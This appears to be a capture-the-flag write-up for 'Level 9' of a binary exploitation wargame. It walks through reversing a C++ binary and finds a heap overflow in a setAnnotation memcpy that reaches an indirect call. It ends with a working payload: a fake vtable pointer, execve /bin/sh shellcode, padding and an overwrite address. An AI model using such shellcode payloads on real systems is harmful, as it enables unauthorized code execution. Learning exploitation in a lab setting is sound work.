### Level 9

#### Basic Recon

![](./Ressources/pics/1.png)

as you can see there's no call to `system` or some `fopen` with `print`. so probably I should insert some shell code via
that `memcpy`
and not obvious how input is being taken no `fgets` or something similar.
it seems that this binary was compiled from c++ how would I know? well you can see `__do_global_ctors_aux`

![](./Ressources/pics/2.png)

as you can see our input is being copied to `0x0804a00c`, we may input our shell code so it'll be stored there, and somehow jump to it

#### Let's Debug

![](./Ressources/pics/3.png)

##### First Look aka quick look

![](./Ressources/pics/4.png)

as you can see there's call to `exit` and `_Znwj@plt` and at line `main+14` there's `jg` i believe it is comparing how many arguments are passed, it'll exit if we did not give any argument. and for `_Znwj@plt` it's being used like this

```c
_Znwj(
    0x6c, // 108
);
```

and it returns something like this `0x804a008`

![](./Ressources/pics/5.png)

what is going inside


![](./Ressources/pics/6.png)

![](./Ressources/pics/7.png)

![](./Ressources/pics/8.png)

well there's malloc and it's being called with input of `_Znwj` and the return value of it is just what malloc has returned

![](./Ressources/pics/9.png)

after that there's call to `_ZN1NC2Ei`

```c
_ZN1NC2Ei(
    0x804a008, // return value of the first malloc
    0x5
);
```

![](./Ressources/pics/10.png)

![](./Ressources/pics/11.png)

as you can see value of eax is `0x804a008` what was returned by malloc.

![](./Ressources/pics/12.png)

in that memory location we put the value `0x8048848` which is probably some pointer to some function this is just maybe for now. the memory look like this for now

![](./Ressources/pics/13.png)

![](./Ressources/pics/14.png)

and the value 0x5 is being stored at the end of the memory that was returned by malloc

![](./Ressources/pics/15.png)

again there's another call to `_Znwj` with the same input as before `0x6c`

![](./Ressources/pics/16.png)

and as you can see `malloc` has returned `0x804a078` which is almost right after the first malloc `0x804a078 - 0x804a008 = 112`, and first malloc has size of 108 that mean only 4 bytes are skipped, why this calculation for now no reason, just info if I needed it!

![](./Ressources/pics/17.png)

again call to `_ZN1NC2Ei` but now we put the value 6 at the last location of the second malloc so the memory look something like this

![](./Ressources/pics/18.png)

till this point I don't see something that I could influence, let's continue

as you can see from the picture below, there's only one call left `_ZN1N13setAnnotationEPc` aside from `call edx`, that must be the weak point.

![](./Ressources/pics/19.png)

let's see now the stack before we call it

![](./Ressources/pics/20.png)

![](./Ressources/pics/21.png)

![](./Ressources/pics/22.png)

![](./Ressources/pics/23.png)

![](./Ressources/pics/24.png)

so unitl this point `_ZN1N13setAnnotationEPc` will be called like this

```c
_ZN1N13setAnnotationEPc(
    0x0804a008,// first malloc
    0xbffff8fe // our input
);
```
let's see what is going on inside

![](./Ressources/pics/25.png)

as you can see there's call to `strlen` with our input

![](./Ressources/pics/26.png)

as you can see `edx` register will have the value of the first malloc

![](./Ressources/pics/27.png)

now `edx` pointing to our malloc + 4

fast-forward to call `memcpy`

![](./Ressources/pics/28.png)

![](./Ressources/pics/29.png)

```c
memcpy(
    0x804a00c, // first malloc+4 and it's stored in edx
    0xbffff8fe, // pointer to our argument
    0x7
);
```

![](./Ressources/pics/30.png)

so `edx` will point to our input, hold on I saw before that there's call to `edx` like this `call edx`, so if we somehow manage to put our shell in the memory and make edx point to it (our shell) we are good, so let's see how edx is being fetched

![](./Ressources/pics/31.png)

let's go step by step now

![](./Ressources/pics/32.png)

![](./Ressources/pics/33.png)

![](./Ressources/pics/34.png)

![](./Ressources/pics/35.png)

as you can see from the pic above

`mov edx, DWORD PTR [eax]` which it says that go to location eax=0x8048848 and get what is there, and later will jump to it,
so we could overwrite that location with the value of the first malloc+4 why +4 because that's our input will be stored

maybe something like this

![](./Ressources/pics/36.png)

where xx xx will be the start of shell code? actually that would be problem because there's another derefrenece

![](./Ressources/pics/37.png)

so actually there should be another address well that's easy
we put there address that will point just right after it something like this

![](./Ressources/pics/38.png)

#### Payload Construction

```py
python -c "print('\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')"
```
this is the first part and we need to fill the rest and then overwrite the desired location

the above stuff will be stored at location `0x0804a00c`, and we want to overwrite the location `0x0804a078` and until now we have 4 for the address  `0x0804a010` and 21 for the shell code so in total 25 bytes are filled now, we need to fill the rest, in total the gap between them is
`0x0804a078 - 0x0804a00c = 108` so we need to add padding of size 108 - 25 = 83, and then put the overwrite value.

```sh
python -c "print('\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A'*83 + '\x0c\xa0\x04\x08')"
```

let's try it
